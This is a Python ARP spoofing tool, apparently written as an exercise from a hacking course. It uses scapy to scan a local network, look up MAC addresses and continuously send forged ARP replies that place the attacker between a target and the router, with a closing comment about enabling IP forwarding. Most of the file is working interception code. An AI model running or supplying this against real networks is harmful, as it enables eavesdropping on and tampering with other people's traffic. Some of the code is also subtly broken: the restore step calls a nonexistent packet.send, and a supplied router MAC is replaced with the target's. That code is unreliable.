# Created by FoxSinOfGreed1729
# Many Thanks to Zaid Sabih and Udemy.com

import scapy.all as scapy
import time
import optparse
import subprocess


# do scapy.ls(scapy.ARP()) to get all related options.
# what we'll be doing is crafting a packet
# we'll change the op variable.
# the op is set to 1 by default which means it generates an arp request
# when op=2, it generates arp response and ARP answer is what we want to send out
# next what we need is the pdst ad\nd hwdst fields - the target we want to spoof
# we need the target to think that we're the router, so we need to set the psrc to the router's IP
# packet = scapy.ARP(op=2, pdst=target's IP ,hwdst=target's MAC, psrc=router's IP)
# after this, the client will register the attacker's mac to the Router's IP

def spoof(target, attacker):
    packet = scapy.ARP(op=2, pdst=target[0], hwdst=target[1], psrc=attacker[0])
    scapy.send(packet, verbose=False)
    # the verbose=false will stop the printing of "1 packet has been sent"


# so now, after we've wrecked havok on the target,
# We'll now restore the initial MAC addresses back
def restore(dest_ip, dest_mac, src_ip, src_mac):
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    packet.send(packet, count=4, verbose=False)
    # count=4 so that 4 packets are sent


def arpScanBroadcast(ip):
    # scapy.ls(scapy.ARP()) will print out all parameters that can be set for the arp query
    # we're interested in the field IPField
    arp_req = scapy.ARP(pdst=ip)
    # print(arp_req.summary())
    # now that we've created the ARP request, we need to broadcast it
    # to broadcast, we need to create an ethernet frame with destination MAC as broadcast MAC
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # print(broadcast.summary())
    # We still haven't created the ethernet frame.
    # the ethernet frame has 2 parts, the data and the MAC
    # we've created both parts and now we'll combine them and create an actual packet
    arp_broadcast = broadcast / arp_req
    # arp_broadcast.show()
    # the above command shows the details of each of the packets

    # we still haven't sent a packet, so we'll do that now
    answered, unanswered = scapy.srp(arp_broadcast, timeout=2, verbose=False)
    # if you want the program to show details, put in (arp_broadcast, timeout=1, verbose=True)
    # this will send a request and returns a couple of 2 lists
    # the timeout is 1, it means, exit if you don't get a response within 1 sec
    # We have results in answered list, but we need the important stuff in a variable
    # to extract this info, we print out using print(answered)
    # that gives the actual list, and we see there are so many parameters
    hwsrc_list = []
    psrc_list = []
    for element in answered:
        # element[1] is the part that gives the response of the clients
        # and what we want is the psrc (IP Source) and hwsrc (HardWare Src)
        # so we do element[1].psrc and element[1].hwsrc
        # this gives the psrc and hsrc of client, but client here is the device that replies to out arp req
        hwsrc_list.append(element[1].hwsrc)
        psrc_list.append(element[1].psrc)
    client_list = [hwsrc_list, psrc_list]
    return client_list


def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast / arp_req
    answered, unanswered = scapy.srp(arp_broadcast, timeout=2, verbose=False)
    print(answered[0][1].hwsrc)
    return answered[0][1].hwsrc


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option('-t', '--target_ip', dest='tar_ip', help='IP Address of Target')
    parser.add_option('-m', '--target_mac', dest='tar_mac', help='The MAC Address of Target')
    parser.add_option('-r', '--router_ip', dest='rou_ip', help='The MAC Address of Router')
    parser.add_option('-a', '--router_mac', dest='rou_mac', help='The MAC Address of Router')
    parser.add_option('-n', '--run_netdiscover', action='store_true', dest='netdis', help='The Attackers IP Address ('
                                                                                          'your own local IP) ')
    parser.add_option('-s', '--scan', dest='scan_ip', help='Scan the local network for IP and MAC addresses (Please '
                                                           'enter like 192.168.1.1/24. The /24 is important)')
    (options, arguments) = parser.parse_args()
    return options


host = []
rou = []
options = get_arguments()

if options.scan_ip:
    result_list = arpScanBroadcast(options.scan_ip)
    print("IP\t\t\tMAC Address\n------------------------------------------------------")
    for i, element in enumerate(result_list[0]):
        print(result_list[1][i], end='')
        print("\t\t", end='')
        print(result_list[0][i])
    exit(0)
    quit(0)

try:
    if options.netdis:
        # ifc_results = str(subprocess.check_output(['netdiscover']))
        # print(ifc_results)
        subprocess.run(['netdiscover'])
except KeyboardInterrupt:
    print("[-] Keyboard interrupt detected.")
    print("[-] Closing Netdiscover")
    print("[-] Closing Program")
    exit(0)
    quit(0)

host.append(options.tar_ip)
rou.append(options.rou_ip)

if not options.tar_mac:
    mac_addr = get_mac(host[0])
    host.append(mac_addr)
else:
    host.append(options.tar_mac)
if not options.rou_mac:
    mac_addr = get_mac(rou[0])
    rou.append(mac_addr)
else:
    rou.append(options.tar_mac)

counter = 0
try:
    while True:
        spoof(host, rou)
        spoof(rou, host)
        counter = counter + 2
        print("\r[+] Number of packets sent " + str(counter), end='')
        # the \r is a special character that will start the printing on the same line, overwriting the prev output
        time.sleep(1.5)
except KeyboardInterrupt:
    print("\n[-] Keyboard Interrupt. Restoring the ARP tables back to normal")
    restore(host[0], host[1], rou[0], rou[1])
    restore(rou[0], rou[1], host[0], host[1])
    print("\n[-] Program terminated due to keyboard interrupt")
    exit(0)
    quit(0)

# remember to allow IP forwarding
# for linux
# echo 1 > /proc/sys/net/ipv4/ip_forward
